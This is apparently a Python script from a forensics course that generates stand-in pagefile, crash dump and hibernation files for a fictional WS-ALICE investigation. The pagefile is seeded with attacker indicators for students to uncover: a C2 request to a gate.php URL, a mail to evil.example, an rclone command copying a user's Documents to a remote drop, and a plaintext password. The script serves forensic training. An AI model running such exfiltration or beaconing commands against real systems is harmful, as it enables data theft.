#!/usr/bin/env python3
"""mk_diskmem_samples.py - build the on-disk "memory" artifacts for the Day 27 labs.

Usage: python3 mk_diskmem_samples.py OUTDIR

RAM also lands on disk, and each form needs a different tool. This writes three small, deterministic
stand-ins (tied to the WS-ALICE case) under OUTDIR:

  pagefile.sys   paged-out memory - unstructured pages; forensic value is the strings/IOCs in them
                 (seeded with a C2 URL, IPs, an email, and a UTF-16LE credential a plain ASCII
                 strings pass would miss)
  crashdump.dmp  a Windows kernel crash dump with a real _DUMP_HEADER64 (PAGE/DU64 signature,
                 version, AMD64 machine type, processor count, bug-check code/parameter) - the
                 format WinDbg and Volatility's crash layer read
  hiberfil.sys   a hibernation file header (HIBR signature) - the compressed RAM snapshot that
                 Hibernation Recon / Volatility decompress (the body here is a stub, not real
                 Xpress-Huffman compressed memory)

These are teaching stand-ins, not captured artifacts: the crash dump has a valid header but no real
physical-memory runs, and the hiberfil is not actually compressed. Standard library only.
"""
import os
import struct
import sys

PAGE = 4096


def pagefile():
    buf = bytearray(4 * PAGE)
    buf[0x00:0x30] = b"\\Device\\HarddiskVolume3\\Users\\alice\\NTUSER.DAT\x00"  # typical paged-in fragment
    buf[0x100:0x100 + 0x40] = b"GET http://203.0.113.50/gate.php HTTP/1.1\x00"
    buf[0x300:0x300 + 0x30] = b"From: alice@corp.example  To: drop@evil.example\x00"
    buf[0x480:0x480 + 0x10] = b"10.20.30.40\x00"
    buf[0x900:0x900 + 0x40] = b"rclone copy C:\\Users\\alice\\Documents remote:drop\x00"
    # a UTF-16LE credential - invisible to an ASCII-only strings pass
    w = "DefaultPassword=Autumn2026!".encode("utf-16-le")
    buf[0xC00:0xC00 + len(w)] = w
    return bytes(buf)


def crashdump():
    """A minimal but real-shaped x64 Windows kernel crash dump header (_DUMP_HEADER64)."""
    h = bytearray(0x2000)                       # header is 0x2000 bytes on x64
    h[0x00:0x04] = b"PAGE"
    h[0x04:0x08] = b"DU64"                       # x64 dump (x86 uses "DUMP")
    struct.pack_into("<I", h, 0x08, 15)         # MajorVersion (NT)
    struct.pack_into("<I", h, 0x0C, 26100)      # MinorVersion (build)
    struct.pack_into("<Q", h, 0x10, 0x1AD000)   # DirectoryTableBase
    struct.pack_into("<I", h, 0x30, 0x8664)     # MachineImageType = IMAGE_FILE_MACHINE_AMD64
    struct.pack_into("<I", h, 0x34, 8)          # NumberProcessors
    struct.pack_into("<I", h, 0x38, 0x7E)       # BugCheckCode = SYSTEM_THREAD_EXCEPTION_NOT_HANDLED
    struct.pack_into("<Q", h, 0x40, 0xFFFFFFFFC0000005)  # Param1 = STATUS_ACCESS_VIOLATION
    return bytes(h) + b"\x00" * PAGE


def hiberfil():
    h = bytearray(PAGE)
    h[0x00:0x04] = b"HIBR"                       # hibernated (Win8+); "WAKE"/"RSTR" while resuming, 0 when clean
    struct.pack_into("<I", h, 0x18, PAGE)        # (stand-in) page size field
    h[0x20:0x20 + 11] = b"ws-alice\x00\x00\x00"
    return bytes(h)


def main(outdir):
    os.makedirs(outdir, exist_ok=True)
    for name, data in (("pagefile.sys", pagefile()),
                       ("crashdump.dmp", crashdump()),
                       ("hiberfil.sys", hiberfil())):
        with open(os.path.join(outdir, name), "wb") as f:
            f.write(data)
        print(f"wrote {os.path.join(outdir, name)}: {len(data)} bytes")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        sys.exit(__doc__)
    main(sys.argv[1])
